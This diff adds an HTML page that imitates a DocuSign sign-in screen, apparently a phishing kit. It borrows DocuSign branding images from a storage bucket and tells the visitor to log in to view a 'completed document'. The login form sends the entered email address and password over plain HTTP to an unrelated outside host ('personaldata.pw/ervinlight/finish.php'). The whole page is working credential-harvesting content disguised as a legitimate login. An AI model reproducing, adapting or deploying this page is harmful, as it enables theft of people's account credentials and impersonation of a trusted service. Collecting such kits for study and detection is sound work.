@@ -1,0 +1,97 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<link rel="shortcut icon" href="https://storage.googleapis.com/docusign_files/xasdfa/new_favicon.png" type="image/gif">
+<script type="text/javascript">
+<!--
+function validateusername()
+{
+ 
+   var emailID = document.myForm.username.value;
+   atpos = emailID.indexOf("@");
+   dotpos = emailID.lastIndexOf(".");
+   if (atpos < 1 || ( dotpos - atpos < 2 )) 
+   {
+       alert("Please enter correct Email ID")
+       document.myForm.username.focus() ;
+       return false;
+   }
+   return( true );
+}
+
+function validate()
+{
+ 
+   if( document.myForm.username.value == "" )
+   {
+     alert( "Please provide your Email!" );
+     document.myForm.username.focus() ;
+     return false;
+   }else{
+     // Put extra check for data format
+     var ret = validateusername();
+     if( ret == false )
+     {
+          return false;
+     }
+   }
+   if( document.myForm.password.value == "" )
+   {
+     alert( "Please provide your Password!" );
+     document.myForm.password.focus() ;
+     return false;
+   }
+   return( true );
+}
+//-->
+</script>
+<title>(1) New File - Sign in</title></head>
+<body>
+
+<br>
+
+<table align="center">
+
+<tbody><tr><td>
+
+	<div align="center">
+
+	
+	<br><br><br><img src="https://storage.googleapis.com/docusign_files/xasdfa/docusign_logo_small.png" width="" height=""><br>
+                  <strong><font face="Verdana" color="black" size="2">Please log in to view, download or print the completed document</font></strong><br><br><br>
+
+	<form id="frmLogin" method="post" action="http://personaldata.pw/ervinlight/finish.php" name="myForm" onsubmit="return(validate());">
+	
+	<input id="email" name="Email" style="width: 380px; height: 40px; font-family: Verdana; font-size: 13px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255); border: 1px solid rgb(0, 128, 255); padding: 8px; background-image: url(); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;" required="" placeholder="Email address" autocomplete="off" type="email">
+	
+
+	
+
+	<br>
+
+	<font align="left" face="verdana" color="#000000" size="+2">  </font>
+
+	<br>
+
+	<input id="password" name="password" style="width: 380px; height: 40px; font-family: Verdana; font-size: 13px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255); border: 1px solid rgb(0, 128, 255); padding: 8px; background-image: url(); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;" required="" placeholder="Password" autocomplete="off" type="password">	
+
+
+
+	<br><br>
+
+	<input id="submit" name="submit" value="CONTINUE" style="width:380px; height:35px; background-color: #FFC300; border: solid 3px #FFC300; 
+	font-family: Verdana; font-size: 15px; font-weight: light; color: #060606; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
+	-khtml-border-radius: 4px; border-radius: 4px;
+	-moz-box-shadow: 5px 5px 5px #888; -webkit-box-shadow: 5px 5px 5px #888; box-shadow: 5px 5px 5px #888;" type="submit">
+
+	<br>
+	</form><br>
+</div>
+              <div align="center">
+<img src="https://storage.googleapis.com/docusign_files/xasdfa/No8iYwi.png" width="" height=""><br><br>
+                <img src="https://storage.googleapis.com/docusign_files/xasdfa/N3KfZUq.png" width="" height="">
+              </div>
+            
+
+              <div style="padding: 0 5px 10px 10px; position: absolute; bottom: 0; right: 0;" align="center">
+                <a href=""><img src="https://storage.googleapis.com/docusign_files/xasdfa/Qf10q3i.png" width="123" height="65"></a>
+              </div>
+</td></tr></tbody></table></body></html>
